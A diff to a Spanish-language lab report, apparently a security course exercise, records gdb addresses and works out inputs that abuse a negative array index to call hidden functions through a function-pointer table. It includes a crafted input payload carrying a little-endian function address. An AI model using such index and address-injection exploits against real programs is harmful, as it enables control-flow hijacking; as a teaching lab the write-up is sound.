@@ -100,11 +100,56 @@ int main() {
 }
 ```
 
+### Pregunta 4. 
+#### ¿Cuál es la dirección de las variables opt y extra? >En qué parte de la memoria se encuentran?
+
+```
+(gdb) p &opt
+$2 = (func_ptr (*)[5]) 0xffffd184
+(gdb) p &extra
+$3 = (func_ptr (*)[2]) 0xffffd17c
+```
+
+### Pregunta 5.
+#### ¿Qué datos de entrada proporcionas al programa para que opt[s] lea (y luego intente ejecutar) la dirección de la función mostrarSecreto1 guardada en extra, en lugar de una función guardada en opt?
+
+```c
+opt = {0x0, 0x56556333 <escribirPalabra>, 0x56556440 <cifrar>, 
+  0x565564f6 <verPalabras>, 0x5655661a <terminar>}
+extra = {0x0, 0x56556300 <mostrarSecreto1>}
+```
+
+```
+Hola! Menú:
+ 1. Escribir palabra
+ 2. Cifrar
+ 3. Ver palabras
+ 4. Terminar
+-1
+Bien! Primer logro conseguido
+```
+### Pregunta 6.
+#### ¿Cuál es la dirección del búfer asociado a la variable resp? ¿Y la dirección de la función mostrarSecreto2?
+
+```
+(gdb) p &resp
+$8 = (char (*)[64]) 0xffffd13c
+
+(gdb) p &mostrarSecreto2
+$9 = (int (*)()) 0x565562cd <mostrarSecreto2>
+```
+
+resp[0..7] = {...}
+resp[8:12] = 0x565562cd
+
+opt[s] = 0x565562cd
+s = -16
+
+-16aaaaa\xCD\x62\x55\x56
+
+### Pregunta 7.
+#### ¿Qué datos de entrada proporcionas al programa para que opt[s] lea (y luego intente ejecutar) a partir de resp[8]?
+
 ## Conclusiones
 
 ## Referencias 
-
-
-magicmagicmagicmagicmagicmagicmagicmagicmagicmagicmagicmagicmagi
-magicmagicmagicmagicmagicmagicma
-2147483647
